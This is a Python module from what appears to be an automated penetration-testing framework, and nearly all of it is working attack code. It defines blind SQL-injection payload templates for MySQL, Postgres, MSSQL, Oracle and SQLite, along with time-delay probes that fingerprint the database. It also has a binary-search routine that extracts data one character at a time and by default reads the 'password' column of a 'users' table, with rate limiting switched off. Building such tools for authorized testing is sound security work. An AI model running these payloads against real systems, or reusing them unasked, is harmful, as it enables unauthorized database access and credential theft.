from __future__ import annotations

import time

from .chain_engine import register_tool
from .config import load_engine
from . import http as _http


_TEMPLATES = {
    "mysql_bool": "1' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}-- -",
    "mysql_time": "1' AND IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char},SLEEP({delay}),0)-- -",
    "postgres_bool": "1' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}--",
    "postgres_time": "1' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
    "mssql_bool": "1' AND ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char}--",
    "mssql_time": "1'; IF ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char} WAITFOR DELAY '0:0:{delay}'--",
    "oracle_bool": "1' AND ASCII(SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1))>{char}--",
    "sqlite_bool": "1' AND UNICODE(SUBSTR((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}--",
}


_FINGERPRINT_PROBES = [
    ("mysql", "mysql_time", "1' AND IF(1=1,SLEEP({d}),0)-- -"),
    ("postgres", "postgres_time", "1'; SELECT pg_sleep({d})--"),
    ("mssql", "mssql_time", "1'; IF 1=1 WAITFOR DELAY '0:0:{d}'--"),
]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _send(url, param, payload, method, headers, timeout, verify, roe_guard):
    t0 = time.monotonic()
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                r = c.post(url, data={param: payload},
                           headers=headers or {}, skip_rate_limit=True)
            else:
                r = c.get(url, params={param: payload},
                          headers=headers or {}, skip_rate_limit=True)
        return {"status": r.status_code,
                "body": (r.text or "")[:2000],
                "elapsed_ms": (time.monotonic() - t0) * 1000.0}
    except _http.ROEBlock as e:
        return {"status": None, "error": "ROE_BLOCK: " + str(e),
                "elapsed_ms": (time.monotonic() - t0) * 1000.0}
    except _http.TimeoutException:
        return {"status": None, "error": "timeout",
                "elapsed_ms": (time.monotonic() - t0) * 1000.0}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}",
                "elapsed_ms": (time.monotonic() - t0) * 1000.0}


def fingerprint_dbms(url, param, method="GET", headers=None, timeout=15,
                     delay_seconds=2, roe_guard=None, verify=None):
    if verify is None:
        verify = _verify_tls()
    baseline = _send(url, param, "1", method, headers, timeout, verify, roe_guard)
    if baseline.get("error"):
        return None, {"error": baseline["error"]}
    base_ms = baseline.get("elapsed_ms", 0.0)
    probes = []
    for name, template_name, tmpl in _FINGERPRINT_PROBES:
        payload = tmpl.format(d=delay_seconds)
        r = _send(url, param, payload, method, headers,
                  timeout + delay_seconds + 3, verify, roe_guard)
        delta = r.get("elapsed_ms", 0.0) - base_ms
        probes.append({"dbms": name, "delta_ms": round(delta, 1),
                       "status": r.get("status")})
        if delta >= delay_seconds * 1000 * 0.5:
            return name, {"baseline_ms": base_ms, "delta_ms": round(delta, 1),
                          "probes": probes}
    return None, {"baseline_ms": base_ms, "probes": probes,
                  "note": "no timing signal"}


def _is_true_timing(r, baseline_ms, delay_seconds):
    if r.get("error"):
        return None
    return r.get("elapsed_ms", 0.0) >= baseline_ms + delay_seconds * 1000 * 0.5


def extract_string(url, param, table, column, dbms="mysql", method="GET",
                   headers=None, timeout=15, delay_seconds=4, max_length=64,
                   max_requests=400, roe_guard=None, verify=None):
    if verify is None:
        verify = _verify_tls()
    template_key = dbms + "_time"
    template = _TEMPLATES.get(template_key)
    if not template:
        return {"extracted": "", "requests": 0,
                "error": f"no template for dbms {dbms}"}

    out = ""
    requests_made = 0
    baseline_ms = 0.0
    try:
        b = _send(url, param, "1", method, headers, timeout, verify, roe_guard)
        baseline_ms = b.get("elapsed_ms", 0.0)
    except Exception:
        pass

    for pos in range(1, max_length + 1):
        if requests_made >= max_requests:
            break
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = template.format(column=column, table=table,
                                       pos=pos, char=mid,
                                       delay=delay_seconds)
            r = _send(url, param, payload, method, headers,
                      timeout + delay_seconds + 3, verify, roe_guard)
            requests_made += 1
            if requests_made >= max_requests:
                break
            true_flag = _is_true_timing(r, baseline_ms, delay_seconds)
            if true_flag is None:
                return {"extracted": out, "requests": requests_made,
                        "error": r.get("error", "unknown")}
            if true_flag:
                low = mid + 1
            else:
                high = mid
        if low <= 32:
            break
        out += chr(low)

    return {"extracted": out, "requests": requests_made, "baseline_ms": round(baseline_ms, 1)}


def _tool_blind_extract(orch, args):
    url = args.get("url") or orch.target
    param = args.get("param") or "q"
    table = args.get("table") or "users"
    column = args.get("column") or "password"
    method = (args.get("method") or "GET").upper()
    max_length = int(args.get("max_length") or 64)
    max_requests = int(args.get("max_requests") or 400)
    roe_guard = getattr(orch, "roe_guard", None)

    dbms, fp_info = fingerprint_dbms(url, param, method, timeout=15,
                                     roe_guard=roe_guard)
    if not dbms:
        return {"verdict": "UNKNOWN",
                "reason": "no blind-injection timing signal detected on param "
                          f"'{param}'",
                "evidence": {"fingerprint": fp_info}}

    result = extract_string(url, param, table, column, dbms=dbms,
                             method=method, max_length=max_length,
                             max_requests=max_requests, roe_guard=roe_guard)
    extracted = result.get("extracted", "")
    if not extracted:
        return {"verdict": "UNKNOWN",
                "reason": f"fingerprinted {dbms} but no characters extracted",
                "evidence": {"dbms": dbms, "requests": result.get("requests")}}
    return {
        "verdict": "VULNERABLE",
        "reason": (f"blind {dbms} extraction recovered {len(extracted)} "
                    f"character(s) from {table}.{column} in "
                    f"{result.get('requests')} requests"),
        "evidence": {"dbms": dbms, "table": table, "column": column,
                     "extracted_value": extracted,
                     "requests": result.get("requests"),
                     "baseline_ms": result.get("baseline_ms")},
    }


register_tool("blind_extract", _tool_blind_extract)
